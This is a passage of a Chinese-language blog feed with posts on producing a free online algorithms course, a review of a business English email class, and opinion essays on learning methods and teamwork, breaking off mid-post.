src="/img/leetcode-alg101-4848b595cef4/1__ImEiRF__fu0dDR8b343W7IQ.png"></p><p>學生可以自行看到測驗題目跟內容並且提交程式碼，會由系統來判定是否正確。若是希望知道更多技術細節，可以參考：<a href="https://blog.techbridge.cc/2020/03/20/build-your-own-online-judge/">自己架一個 Online Judge 系統</a>，裡面有完整說明。</p><p>不過在系統架設上沒有花太多時間，因為是拿別人已經做好的開源系統來改。最花時間的其實是出題目。對，你有想過題目哪裡來嗎？原本我想要用一個叫做 NPSC 比賽的題目，但去詢問過後發現沒有辦法，只好轉個念頭：好吧，就讓我自己出題吧！</p><p>目前系統上面的 50 幾題題目都是我自己出的，包括題目敘述跟測資，都是我一個人弄的。原本想要出到 100 題，後來想說算了，這樣要花太多時間，先把必要的題目弄好就行了。</p><p>以上就是我所說的前置作業，為了搭配課程，必須要先架設出一個線上批改系統，並且自己出題目讓內容變得豐富。</p><h3 id="課程簡報製作"><a href="#課程簡報製作" class="headerlink" title="課程簡報製作"></a>課程簡報製作</h3><p>這時候就能開始錄製了嗎？還沒！</p><p>在錄製以前還有最後一樣前置作業，那就是課程簡報。需要有課程簡報搭配課程影片，才能讓重點更加明確。</p><p>這次的課程簡報我捨棄了以前常用的 Keynote 或是 Google Slides，使用了很潮的 <a href="https://github.com/jxnblk/mdx-deck">mdx-deck</a>。這是什麼呢？這是一套可以用 Markdown + React 來做簡報的工具，會用這套的主因其實是想要嘗試 <a href="https://codesurfer.pomb.us/">Code Surfer</a> 這一套潮到爆的工具，可以達成的效果如下：</p><p>undefined</p><p>能夠針對程式碼來做一些動畫，而且設定的方式滿容易的。就是因為想嘗試這一套工具，所以才採用了 mdx-deck。而使用這一套的好處還有一個，那就是最後做出來的簡報其實就是網頁，可以直接放到 GitHub 上面，並且透過 GitHub Pages 讓大家瀏覽！</p><p>做簡報的時候也是重新檢視課程大綱的機會，發現哪邊有問題就回去把大綱修一修，沒問題的話就照著大綱把簡報弄出來。最花時間的就是我上面提到的程式碼的動畫，因為需要設定一些東西，所以有點繁瑣，不過看到效果就會覺得一切都值得了。</p><p>在製作簡報的同時腦中也可以一併思考在錄製時應該要講一些什麼內容，這樣在錄製的時候就會容易很多。</p><h3 id="課程錄製"><a href="#課程錄製" class="headerlink" title="課程錄製"></a>課程錄製</h3><p>簡報完成了，終於可以來進行課程的錄製。</p><p>這邊先來介紹一下我錄製時會使用的工具：</p><p><img src="/img/leetcode-alg101-4848b595cef4/1__Dn6Hve9QroebmdUzUIjvmw.jpeg"></p><p>硬體部份是：</p><ol><li>MacBook Pro (Retina, 13-inch, Early 2015), 2.7 GHz i5, 8G RAM</li><li>22 吋 LG IPS FULLHD 顯示器</li><li>羅技 C922 PRO STREAM 網路攝影機</li><li>Blue Yeti 雪怪麥克風</li></ol><p>軟體部分則是使用 OBS：</p><p><img src="/img/leetcode-alg101-4848b595cef4/1__joCbCfqxPrTdXoeB9QLykQ.png"></p><p>有人可能會問說：「那後製呢，你用什麼後製？」，不好意思，目前課程內容都沒有後製，都是沒有混直接發，課程影片也都是一刀未剪一鏡到底。會這樣做純粹是因為偷懶而且節省時間（後製加上影片輸出要花不少時間），這也是我一直說自己的課程影片品質不夠好的主因。</p><p>每次錄課程都會盡量把一個大單元錄完，只有錄的第一個影片會點開聽一下聲音，看一下影像，看看有沒有什麼地方怪怪的，沒有的話就繼續錄下去。錄完之後會先把影片檔改檔名，這樣方便辨識。</p><p>整個單元都錄完之後就把課程影片先傳到 Google Drive 保存，再傳到 YouTube 做備份，傳到 YouTube 的另一個好處是可以開放部分影片當作試看以及宣傳。</p><p>錄製課程的效率根據當日狀況而定，狀況好的話一天可以錄完三個單元，不好的話可能錄個一兩支影片就累了。如果在影片中沒有什麼太大的失誤，我通常都不會重錄，所以滿多影片就是錄一次就錄完了。</p><h3 id="上架及發布課程"><a href="#上架及發布課程" class="headerlink" title="上架及發布課程"></a>上架及發布課程</h3><p>現在萬事俱備，只欠東風了。課程相關的資源差不多都準備完畢了，只要把課程上架就行了。目前 Lidemy 所使用的課程系統是 Teachable，後台長這樣：</p><p><img src="/img/leetcode-alg101-4848b595cef4/1__wYHyRkjVJQ__5pzdMWHi__Ag.png"></p><p>Teachable 有一個很棒的功能是從 Google drive 直接把影片同步過來，這功能超級方便！而且搭配批量上傳可以讓上架課程變得超容易，效率快很多。這邊基本上就是新增一下課程內容，上傳課程影片，然後再把相關的資源給貼上去。</p><p>課程內容的部分處理好了，最後就是來寫一下課程介紹，這樣介紹頁面才有東西。還要做一下課程的封面圖，身為一個不會做圖的人，發現 keynote 意外的好用，我都是直接用 keynote 來做圖：</p><p><img src="/img/leetcode-alg101-4848b595cef4/1__dMIbYsr2NYa8uwOMgE__88g.png"></p><p>東西都準備完成以後，就可以發布課程囉！課程製作也到此告一段落。</p><h3 id="課程製作心得及檢討"><a href="#課程製作心得及檢討" class="headerlink" title="課程製作心得及檢討"></a>課程製作心得及檢討</h3><p>把這堂線上課程完成並且推出以後，最大的獲益者其實是我，因為這是一堂我很想做的課程。我的課程是由上往下的，意思是，當有些人覺得課程 A 太難的時候，我就會想說是不是缺少了一些什麼基礎，所以才會覺得 A 很難？當我找到缺少的那一塊，就會來做課程 B，補足 A 沒有提到的先備知識。</p><p>以此類推，有可能課程 B 還是太難，就有了課程 C。所以我才說課程是由上往下的，因為很多時候我並不知道課程 A 是難的，我以為已經夠簡單了。而這次的先別急著寫 leetcode，就是我原本以為不需要的一堂課。</p><p>之所以會對這堂課感到這麼興奮，是因為它總結了許多我想做的事，像是：</p><ol><li>架一個 OJ 系統並且自己出題</li><li>把簡報、製作流程跟範例程式碼都公開出去</li><li>用 Git 記錄製作流程</li><li>用很潮的方法做簡報</li><li>幫助初學者</li></ol><p>我很開心能夠完成這個作品。</p><p>話說有個小插曲稍微提一下好了，那就是這堂課的收費，其實我中間有在思考這堂課是不是應該收費，或是想說也可以課程內容不收費，可是作業檢討影片要收費，這樣一半收費一半免費的模式。</p><p>但後來我還是決定這堂課要免費，原因很簡單，那就是我希望這堂課是個初學者必備的課程，是一堂修完之後，會跟其他人推薦的課程。為了更容易把這堂課散播出去，免費的效益是最高的。</p><p>再者，就跟我當初<a href="/2018/09/18/hahow-and-lidemy-2dab35919bb8/">下架 Hahow 上面課程</a>的理由一樣：</p><blockquote><p><em>作為一堂基礎課程，就代表無論你修哪一個程式語言，你都可以在這邊找到有用的參考資料。我希望這樣子的課程是免費的，是可以公開給大家的，而我也確信這樣可以幫到更多的學生。</em></p></blockquote><p>然後這一堂課也有一些尚未改進的缺點，例如說：</p><ol><li>簡報內容有誤，有些錯誤甚至在錄製時沒有發覺，就照著簡報念過去了</li><li>課程後期有些地方應該要用簡報輔助，但是卻只有口頭帶過</li><li>備課有進步空間，有些概念在錄製時沒有講得很清楚</li><li>OJ 上的題目有誤</li><li>課程影片品質還有進步空間</li></ol><p>先在這邊記著，以後才不會忘記。如果你上過課程並且發現一些可以改進的地方，麻煩請讓我知道，可以直接在文章底下留言。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>寫這篇文章主要是想記錄一下自己做這堂課的流程以及心得，如果有人對這堂課的製作過程感到好奇的話，就可以來參考看看。而我自己其實也滿好奇其他人在製作線上課程的流程是什麼樣子的。</p><p>最後呢，當然也不免俗地要來宣傳一下這堂課程。</p><p>這是一堂課程內容將近 10 個小時的免費課程，目標族群是會寫程式卻覺得自己基礎不紮實的人，藉由一系列的基本題目來熟悉程式基礎語法以及程式思維，詳情可以參考課程說明：<a href="https://lidemy.com/p/alg101-leetcode">https://lidemy.com/p/alg101-leetcode</a></p><p>想持續關注的話可以 follow 一下，單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/?source=post_page---------------------------">Lidemy 粉絲專頁</a>。想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium?source=post_page---------------------------">https://aszx87410.github.io/blog/medium</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLN 新貴語文電郵寫作班心得（下）</title>
      <link href="/2020/03/02/cln-email-writing-part2-40213f9302a7/"/>
      <url>/2020/03/02/cln-email-writing-part2-40213f9302a7/</url>
      
        <content type="html"><![CDATA[<p>這篇是下集，還沒看過上集的可以先看上集：<a href="/2019/12/23/cln-email-writing-part1-5262fcd9ff79/">CLN 新貴語文電郵寫作班心得（上）</a></p><p>上集的內容是上完了一半的課程以後寫的，主要談到了三點：教學內容、風格以及課堂氣氛，而下集的內容就是來講講上完全部課程（一共十堂，外加一堂加課）以後的心得。</p><p>這篇會著重在兩個點：</p><ol><li>後半段課程內容</li><li>課程優缺點</li></ol><h3 id="後半段課程內容"><a href="#後半段課程內容" class="headerlink" title="後半段課程內容"></a>後半段課程內容</h3><p>先來講一下全部課程內容大概包含哪些東西好了，一共有六大項：</p><ol><li>Basics（基本架構以及基礎知識）</li><li>Language focus（寫信常見錯誤、動詞型態的變化等等）</li><li>Style（各種不同的寫信風格及用詞）</li><li>Professional（各種專業內容）</li><li>Problems（抱怨跟道歉的信應該怎麼寫）</li><li>Reports and analysis（如何寫 report 以及分析趨勢之類的）</li></ol><p>其中老師特別打星號的是第四項：Professional，因為裡面有許多可以直接拿來應用的 email。</p><p>課程前半段大概就是上到 professional 之前，後半段從 professional 開始一路上完。所以說前半段的課程大概就是打好基礎，後半段課程則是在工作上寫 email 的實戰運用。</p><p>直接舉一個教科書裡面出現的例子（在書裡面其實中間有個段落有講理由，我把理由的部分先修掉了，不影響我想表達的意思）：</p><blockquote><p>Thank you for taking the time to attend an interview with us last week. Unfortunately, we have to inform you that your application has not been successful. We appreciate your interest in working with us, and we would like to take this opportunity to wish you every success in the future.</p></blockquote><p>看到這個範例的時候我直接在旁邊打三個星號，寫下：心有戚戚焉。事實上，身為一個已經有在全英文環境工作過的人，看到這本書的內容一定都會有同樣的感受，覺得很熟悉，但卻又有點陌生。</p><p>熟悉的點在於工作上看過太多太多類似的東西了，所以一看就知道說：「對，就是這樣，我同事都這樣用的！」，而陌生的理由在於「不會用」，看過、知道有人這樣用，但是自己要用的時候卻記不得。這時候有好的教材來輔助學習就很重要，而這本教材之後也可以當作參考用書，要寫 email 的時候就拿起來翻，試著回憶一下。</p><p>後半段這些專業的信件，幫助比較大的是那種平常就很常需要寫商用信件的職位，例如說有講到怎麼跟供應商詢價，然後該怎麼報價，怎麼確認訂單以及怎麼確認付款細節等等。</p><p>而對於像我（工程師）這種平常不會寫到這些信件的人，也有幫助很大的內容，例如說有兩個章節叫做：Arranging a meeting 跟 Job application，這兩個章節就十分實用。</p><p>總結一下好了，課程前半段打底，後半段開始進入各種場景更明確的 email 寫作，有些章節對於某些職缺不一定用得到，但我覺得還是滿值得學一下，畢竟你永遠無法預期未來會發生什麼事。而其中也有一些大家都用得到的場景，例如說求職或是寫道歉信之類的。</p><h3 id="課程優缺點"><a href="#課程優缺點" class="headerlink" title="課程優缺點"></a>課程優缺點</h3><p>先把課程缺點擺前面講好了，主要的缺點我覺得有兩個。</p><h4 id="缺點：課程調動頻繁"><a href="#缺點：課程調動頻繁" class="headerlink" title="缺點：課程調動頻繁"></a>缺點：課程調動頻繁</h4><p>原本訂的課表，最後有三四堂課都被調時間，有些從原本的週日下午變成週日晚上，有些則變成週三晚上，而週三晚上其實對上班族來說是個比較不友善的時間，因為剛上完班就來上課，會顯得比較沒有精神一點，而出席率比起假日也是相對低了許多。</p><p>不過應該只有我這一期會碰到這種狀況，是因為在開課前公司內部沒有協調好，所以才會發生這種頻繁調課的情形，有了這次經驗以後，之後應該會改善許多。</p><h4 id="缺點：課程進度延遲"><a href="#缺點：課程進度延遲" class="headerlink" title="缺點：課程進度延遲"></a>缺點：課程進度延遲</h4><p>老師在上課的時候若是偶爾講到一些與課程內容無關的話題，我自己覺得這很 ok，沒什麼問題，但是比例要拿捏得好不是件容易的事。以這次的課程來說，我覺得比例稍微高了一點，因為影響到了課程進度。</p><p>原本預計是十堂課要教完，因為進度落後的關係，最後多加了一堂課。</p><p>而加課的可能原因我覺得有兩個啦，一個就是我前面講的與課程內容無關的話題佔了一些時間，還有一個就是補充內容的時間沒有拿捏好。</p><p>前者舉例來說，老師有講了他之前買房的一些經歷，就花了一些時間，而之前有一次看了「看不見的大猩猩」的實驗影片也花了些時間。</p><p>而補充內容的部分，例如說之前有看過一段六人行的影片，與課程內容（email 寫作）沒什麼關係，但因為跟英文教學有關所以當成補充內容，這也花了一些時間。這可能是原本就預計要教的內容，但是時間沒掌控好。</p><p>而針對進度延遲這個問題，目前 CLN 的解決方法是免費加課，最後再加一堂課把該上的內容都上完，是滿負責任的做法。</p><p>然後這邊也要提一下，其實我個人是滿喜歡老師講故事跟補充內容這些東西，所以對我來說其實沒有太大問題。不過若是有些人滿在意時間掌控的話，或許這會是個問題。</p><p>缺點大致上來說就是這兩樣，接著講優點。</p><h4 id="優點：補充內容豐富"><a href="#優點：補充內容豐富" class="headerlink" title="優點：補充內容豐富"></a>優點：補充內容豐富</h4><p>先來一張字很醜的筆記：</p><p><img src="/img/cln-email-writing-part2-40213f9302a7/1__hnhv5IvwoertIQn0wcadeQ.jpeg"></p><p>這是之前某一次上課時的筆記，老師剛好補充到武漢肺炎的議題，問了我們「急缺」、「指定藥局」以及「口罩限額」這三個字應該要怎麼翻成英文。這種的補充資料其實很多，要嘛就是給中文要我們翻成英文，要嘛就是給英文然後要我們說出中文翻譯是什麼。</p><p>我覺得眾多的補充資料是這堂課的精華之一，可以在電郵寫作之外額外學習到很多英文相關的知識。</p><p>還有一個滿有趣的點是老師有時候會舉一些中文的文法當作範例，可以深刻體會到什麼叫做「文法」，什麼又叫做「憑語感」。例如說量詞：一雙、一對、一副，這三個有什麼區別？</p><p>身為中文母語的人，我們憑的是語感，因為沒有人講一雙眼鏡，所以一副眼鏡才是對的。但是到底一雙跟一副的差別在哪邊？這就是中文的文法，是母語人士的我們沒有注意到的部分。</p><p>總之呢，無論是單字、時事話題、專有名詞還是文法，這堂課通通都有補充到。</p><h4 id="優點：分組討論"><a href="#優點：分組討論" class="headerlink" title="優點：分組討論"></a>優點：分組討論</h4><p>其實我一開始還滿擔心課程分組討論的，因為我本來就不是很喜歡分組的一個人。有時候分組討論會弄的滿尷尬的，沒有什麼人願意出來講話，整個氣氛就會很乾。</p><p>但是這邊的分組討論不一樣的是討論的主題非常明確，例如說：</p><blockquote><p><em>suffer from 跟 suffer 差在哪裡？</em></p></blockquote><p>因為主題明確的關係，所以討論起來就滿容易的。而這些分組討論的機會不少，雖然說大多數時間都回答不出正確答案，但是討論本身就有其價值，至少是給自己一個強迫思考的機會。</p><p>還有另一個好處是因為有在思考有在講話，所以上課完全不會有想睡的感覺。這個我在上一篇應該提過，我覺得滿神奇的，以前高中上個英文課才 45 分鐘之類的就睡死，長大之後怎麼上三小時的英文課都不會想睡。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這是堂電郵寫作課程，但不只有電郵寫作，這是我覺得課程最大的優點之一。除了教你寫以外，同時也幫你補充各種單字以及文法基礎，也會提到一點點的翻譯，讓你去想該怎麼把一段英文翻得更好，該怎麼更精確地用詞。</p><p>而電郵寫作本身就不用說了，可以學到一大堆慣用法，而且我能保證這真的是慣用法，因為我看到的時候既視感超深，以前在工作上看過一大堆一樣的用法。但是透過自己學習是零散的，透過課程來學習是系統化的，可以分門別類，一個種類一個種類的去學習，課本上的練習也能夠對這種用法印象更深刻。</p><p>總之呢，如果你常常對寫 email 這件事感到害怕或是不知所措，我是相當推薦這門課程的。</p><p>最後，再次感謝 CLN 的邀請，同時也附上相關資料，有興趣的讀者們可以參考看看：</p><ol><li><a href="https://cln-asia.com/">CLN 官方網站</a></li><li><a href="https://www.accupass.com/event/2002180549101046452182">電郵寫作課程連結</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用對你有效的學習方法，無論那是什麼</title>
      <link href="/2020/02/10/learning-c6656ef14cd4/"/>
      <url>/2020/02/10/learning-c6656ef14cd4/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/learning-c6656ef14cd4/0__3TupepOWzYc8rFxz.jpg"></p><p>其實不只學習方法，做事方法也是一樣的。</p><p>有時候「有效」的定義是因人而異的，當你找到一種對自己有效的學習方法以後，不需要管別人說什麼。對他們或許沒用，但至少你很確信對自己有用。</p><p>舉例來說，學英文。</p><p>許多人倡導要把英文融入環境裡，聽英文、說英文、寫英文、讀英文。平時可以多吸收英文相關的資訊，浸淫在這個環境裡面，英文就會慢慢進步。</p><p>背單字？那種填鴨式的學習法絕對不要，學英文背什麼單字，背單字是沒有用的，要搭配情境才能把單字學得好。</p><p>這種說法是有其道理沒錯，但不一定適用每一個人。</p><p>比如說我就覺得背單字挺有效的，但我也不是直接拿起七千單開始背，而是搭配一大堆單字選擇題進行題海戰術，每寫一題就學會四個以上的單字，又可以培養閱讀能力又可以練單字，對我來說十分有效。</p><p>而看電視還是一直可以看到廣告的某些英文諧音記憶法，雖然我看的時候覺得成效應該不會很好，第一是發音可能因為用中文諧音來記所以會有問題，第二是可以記的單字量有限。不過若是你有試過這種方法而且覺得很有效，那你管我說什麼，用就對了。</p><p>我以前寫過一篇：<a href="https://blog.huli.tw/2019/11/01/before-start-leetcode/">程式解題新手入門注意事項</a>，跟大家說我不贊成無腦刷題，變成：「看過的題目就會，沒看過的就一定不會」，但如果你刷題刷得很有成就感也很有效，那也不用管我說什麼，不用管其他人說什麼，就繼續刷你的題就好。</p><p>再舉個例子，在程式界小有名氣的<a href="http://smalltalk.xdite.net/posts/313532-how-to-learn-a-skill-quickly">肌肉學習法</a>也常常被反對，但如果你真的試過而且有效，why not？對你有效的東西就是有效，不會因為別人說這個沒效就變成沒效。</p><p>在學習上有些人認為方法什麼的都是假議題，腳踏實地才是唯一正途；也有些人覺得可以找到事半功倍的學習方法，於是花了許多時間在找它，卻遲遲還沒開始學習。</p><p>先講一下我的經歷，我認同學習方法一定有優劣之分，例如說背單字好了，拿著一本普通單字書開始背，跟拿著一本有寫單字出處以及字根字首的書背單字，後者對我來說就有效許多，因為那些單字出處跟字根可以加強我的記憶力以及興趣。</p><p>但若是矯枉過正，就會變成花大部分時間在尋找學習方法，反而捨本逐末。</p><p>所以我的想法很簡單，就是做人不要那麼極端（單押 * 1）。先花大概一兩成的時間尋找學習方法，找到不錯的以後就開始學習了。</p><p>然後尋找學習方法不只有「找」，其實是「找跟試」，你不試試看怎麼知道有沒有效？</p><p>有些人就是很奇怪，明明就是自己花時間去試就可以知道結果的東西，卻一定要問人。可能是懶惰或也有可能是其他因素，我不知道。</p><p>例如說有人會拿著一段程式碼問我說：「這個的輸出會是什麼？」，你只要打開你的電腦跑一下就可以知道結果，為什麼要來問我？</p><p>或者是有人會問說：「程式我可以學得會嗎？」，網路上這麼多免費的程式線上課程資源，為什麼你不去試一下？我跟你說你學不會，你就不學了嗎？跟你說學得會，你就一定學得會嗎？</p><p>我真的不懂為什麼很多人沒有「試試看」這個 mindset，好像「試一下」這個選項從來不在他們的腦海裡面。我其實可以理解在試之前會有的一些焦慮跟不安，但請注意花在前置作業的時間。</p><p>花一個禮拜到處去找「程式容易學嗎？」的資料，不如花兩天找資料，再把剩下五天都實際拿去學程式（可以把程式帶換成任意學習科目），你就知道自己學不學得會了。</p><p>學習這種事情，別人的回答別人的案例都只是「僅供參考」，就算你們學歷相近、背景相近、年齡也相近，對方的經驗也不見得可以套用在你身上。不過這並不是說別人的經驗沒有用，我想表達的就是我上面所說的：「先花大概一兩成的時間尋找學習方法，找到不錯的以後就開始學習了」</p><p>例如說你想學程式，開始找有沒有什麼推薦的課程，這個十分合理。找了一兩天發現有許多人都推薦 CS50，此時會有兩種人：</p><ol><li>很焦慮地跑去四處問人：請問我背景 xxxx，CS50 適合我嗎？</li><li>直接跑去修 CS50，再看看結果如何</li></ol><p>假設第一種最後得到的結論是適合，那結果跟第二種人是一樣的，但是晚了幾天修課。</p><p>假設第一種最後得到的結論是不適合，那然後呢？還有什麼課程是適合的？</p><p>就算 CS50 真的不適合好了，這也是修個一兩週就可以知道的結果。而且你會知道為什麼不適合，會知道實際的理由。因此你修完之後，就可以上網發問說：「我已經修了 CS50，但是因為 AAA 跟 BBB 的關係，我覺得不太適合我，有沒有推薦什麼更適合的課？」</p><p>這樣的問題比你拿你的背景來當佐證資料有用的多，因為實際很多，廣大的網友們也能更清楚知道該推薦你什麼樣的課。</p><p>可以花時間找尋學習方法，找尋適合自己的學習資源，但是要注意時間。不要每次都只花時間找，卻沒花時間學，這樣只是本末倒置。還不如直接去學，然後再看看問題出在哪裡。</p><p>喔對了，最後再重申一件事情，就是我們的標題：「用對你有效的學習方法，無論那是什麼」，也就是說，如果你每次都花很多時間找，然後覺得這樣的學習方法很有效的話，那請忽略我上面所講的一切，不用管我說什麼，照你用過也覺得有效的方法去學習就好。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>談團隊合作與個人英雄主義</title>
      <link href="/2020/02/09/teamwork-d2d0ac73812/"/>
      <url>/2020/02/09/teamwork-d2d0ac73812/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/teamwork-d2d0ac73812/0__JiotBXnj2WOq6zeV.jpg"></p><p>我一直都知道個人的力量是有限的（除非你真的有特異功能，像是超人那樣，那就另當別論），但我同時也相信，能力強大的個人還是勝過於整個團隊（在具備某些前提之下）。</p><p>團隊合作的強大之處在於分工合作，把工作分發下去，相信每個人都可以做完，並且交付出一定品質的成果。除此之外，團隊也可能彼此激盪出不同的想法，但與個人比起來，就是多了溝通成本。</p><p>個人的強大之處就是沒有溝通成本，也沒有信任與等待的問題，自己一個人就可以把事情全部搞定，但缺點就是一個人時間有限能力也有限。</p><p>那能力強大的個人為什麼可以勝過整個團隊呢？</p><blockquote><p>因為團隊的精髓不是在於人數，而是在於能力。</p></blockquote><p>前面有講過，團隊強大之處在於「每個人都可以交付出一定品質的成果」，這就代表一個好的團隊，個人能力絕對是必須的。若是團隊裡每個人都沒有一定的個人能力，那組成團隊並不會比較好。</p><p>舉例來說，學生時期的分組報告，許多人都有碰到某些組員擺爛或是很雷的經驗，這時候都會想說：「是不是自己一個人來比較快？」。對，還真的比較快。</p><p>以前我曾經一個人幫整組做完分組報告，順便把其他五個人的做報告心得也一起寫了。因為這樣有效率太多了，我一個人找資料、整理，可能一兩個晚上就可以做完，但若是碰到擺爛拖延的組員，光是溝通時間就不只這些了。</p><p>或者是以前有參加過一個 App 提案的比賽，一組兩到三個人，負責交出一份與參賽主題相關的 App 提案。我參加了，但我一個人，然後我一個人寫了六份提案，六份全部都有得獎。</p><p>再舉一個例子，以前參加過某個黑客松，我負責 App 的部分，等了隊友的後端 API 等了一天，一度想要自己跳下來做。事後再回想起來，我一個人參賽還比較有效率，一定比能力差的隊友還要快。</p><p>若是你有碰過雷隊友，一定能明白我所說的：</p><blockquote><p>能力強大的個人勝過一個團隊。</p></blockquote><p><strong>不過要特別強調一下，前提是團隊中的個人，能力本來就不佳。</strong>所以我並不是說能力強的個人就好棒棒，團隊就是爛爛爛。</p><p>舉上面那個黑客松的例子，如果我的隊友們能力好一點，不用到很強，就是熟悉自己的領域就好，那做起事來一定比我一個人自幹前端後端再加 App 還要快。</p><p>接著來舉幾次團隊合作順暢的例子，通常都是在工作上碰到的。</p><p>例如說因為要做的東西太多，所以把某個原本自己在負責的功能交給同事寫，原本其實滿擔憂同事效率不佳，因為自己最熟悉那個功能，知道自己只要一兩個小時就可以搞定，但後來發現同事其實也滿快搞定的，完全享受到團隊合作的好處：有人幫你 cover 其他事情。</p><p>或是身為做前端的，都要等後端的資料好了以後才能串接然後把整個專案做完，我也經歷過有那種後端效率很高，把 API 文件都先開出來讓你可以先串，也先把測試環境的資料放一放讓你可以先測幾個重要的 endpoint，從開發到上線都很順暢，不用互相等來等去。</p><h3 id="個人英雄主義？"><a href="#個人英雄主義？" class="headerlink" title="個人英雄主義？"></a>個人英雄主義？</h3><p>我有時候會在想，我開頭所講的那句：「能力強大的個人勝過於整個團隊」算不算是個人英雄主義的展現？雖然我也沒有很懂這個詞是什麼意思，但我查了一下大概就是：</p><ol><li>重視個人而非團隊，覺得個人能力比誰都厲害，強調個人力量</li><li>覺得自己才是重要的，會抱怨其他團隊成員能力不佳</li></ol><p>一般來說會認為個人英雄主義與團隊合作是無法相容的，畢竟一個強調個人，一個強調團隊。但我其實不這麼認為，我覺得稍微修改一下，就可以相容在一起：</p><ol><li>團隊中個人能力是重要的</li><li>重視個人也重視團隊，相信個人能力，也相信其他人的能力</li></ol><p>在以往我認為良好的團隊合作裡面，個人能力都是足夠的。也因為大家彼此都知道能力是夠的，才能去信任對方，形成一個團隊。如果你明知道某個團隊成員能力不足，那你怎麼可能對他有信任感？</p><p>以上講的前提都在於「團隊中每個人都有一定能力」，而這個當然是最佳的狀況，也是最理想的狀況。</p><p>可是在職場上不一定會碰到這種狀況，有時候公司是願意收新人進來培養的，或是你一進去就發現有些同事能力不足，這時候該怎麼辦？</p><h3 id="如何改造不理想的團隊"><a href="#如何改造不理想的團隊" class="headerlink" title="如何改造不理想的團隊"></a>如何改造不理想的團隊</h3><p>若是現況就已經是：「有些成員能力不足而且無法更換」，那當然就沒必要以個人英雄主義去抱怨那些成員，因為抱怨也沒有用，不會讓事情更好。</p><p>以我來說，我會做的事情很簡單，那就是：</p><blockquote><p>去提升那些成員的能力</p></blockquote><p>如果成功提升起來了，那事情當然就解決啦！從根本去解決問題。</p><p>所以才會需要職場前輩去帶人，去試著提升那些成員的能力。當團隊中有人能力不足時，唯有提升個人能力，才能提升整體團隊的效率。</p><p>那如果那個成員本身不上進，完全不想提升自己的能力呢？很簡單，當然就是解決有問題的人，把它 fire 掉。若是因為種種原因，他還是繼續留在團隊的話，那當然就是我走掉。</p><p>在團隊裡面有某個人能力不足而且又無法提升的情況下，團隊合作才不是什麼卑躬屈膝、委曲求全，這樣所求得的和諧只是假象，只是團隊表面上看起來合作愉快，事實上就是有個洞在那邊。有個洞還不打緊，補不起來才是問題。我認為這樣的和諧完全沒有必要，只是繼續空轉而已。</p><p>所以我認為能力強大的團隊，前提在於個人能力的強大。就算剛開始不強大，也能靠著團隊的資源去拉起那些掉隊的人，讓個人能力提升，團隊整體的能力才會提升。</p><h3 id="再談團隊合作與溝通"><a href="#再談團隊合作與溝通" class="headerlink" title="再談團隊合作與溝通"></a>再談團隊合作與溝通</h3><p>如上所述，我認為團隊合作順暢與否跟個人能力有關，也與團隊間的默契與目標有關。</p><blockquote><p>要怎麼增進團隊的默契以及和諧程度？</p></blockquote><p>針對這一點，有許多人會給出的答案大概是：「小組活動（team bonding 或是 team building）」之類的。例如說大家一起去攀岩啦，打雷射槍啦，聚餐啦，唱唱歌聊聊天啦，諸如此類的。</p><p>有聽過「平時多互動交流，合作起來才會更順利」這個說法，但我其實不這樣認為。我覺得平常沒互動但工作上還是合作的很好，這才叫專業，這才叫團隊合作，這是種專業技能而不是需要靠交情的東西。</p><p>上面這些活動對我來說比較像是「交朋友」，而不是教你怎麼團隊合作。這是兩回事。</p><p>好朋友不一定能一起工作，能一起工作的人也不一定要變成好朋友。</p><p>如果讓同事變朋友可以讓工作效率更好為真，那麼同樣也得面臨「朋友化」之後的困擾。例如說當某個員工離職了，那與他感情很好的員工是不是也會思考要不要一起走？於是感情好的朋友們都一起走了。</p><p>再者，若是公司同意「交情更好就能讓工作變得更順利」，那是不是會產生另一種問題？</p><p>假設上述為真，那是否「A 跟 PM 交情較好，所以 A 的需求 PM 會排在前面」也為真？如果是因為這種原因才使得「交情更好就能讓工作變得更順利」為真，那就代表員工做事的時候是交情在先，公司目標在後，我不認為這樣是好的。</p><p>還有另一種可能，那就是「交情更好就能讓工作變得更順利」，是因為更了解對方的個性，所以合作起來就更順暢，彼此溝通更順利。這我倒是認同，不過若是想達成這樣的目標，與其去玩密室逃脫，不如讓大家一起去上職場溝通課，由專家教大家怎麼與各類型的人溝通，我覺得還比較有效一點。</p><h3 id="談「想要有人帶」"><a href="#談「想要有人帶」" class="headerlink" title="談「想要有人帶」"></a>談「想要有人帶」</h3><p>很多人（包括我自己）在剛入行時，都想要有一個完整的團隊，然後有一個比較資深的工程師可以帶我。這很正常，站在自己的角度，能有這樣的環境當然是最棒的。</p><p>但與此同時也呼籲這樣想的人順便想一下這個問題：</p><blockquote><p>為什麼這樣的團隊要選我，而不是其他人？</p></blockquote><p>現實狀況就是僧多粥少，有這樣環境的公司並不多，所以想要進去這樣的環境，是需要與其他人競爭的，而你的優勢在哪？</p><p>若是你個人能力本來就不強，<strong>只想靠著</strong>進這樣的環境來提升個人能力，而自己卻什麼都不做，那為什麼團隊會收你？為什麼團隊不去找其他個人能力更強的人？</p><p>對我來說，我一直相信提升個人能力才是治本的方法。想要進優秀的團隊、如何與優秀的團隊一起共事，這些都在提升個人能力以後可以找到答案。</p><p>想要有人帶沒有錯，但「只想靠著被帶而提升能力」就是不切實際的幻想了。就像玩線上遊戲一樣，你才十等而已，我幹嘛跟你組隊練功？你只會一直吸我經驗而已，怪你又打不死；我當然是去找等級跟我差不多的人，這樣可以吃整個地圖的怪，互相分享經驗值，才會成長得快。</p><h3 id="結語"><a href="#結語" class="headerlink" 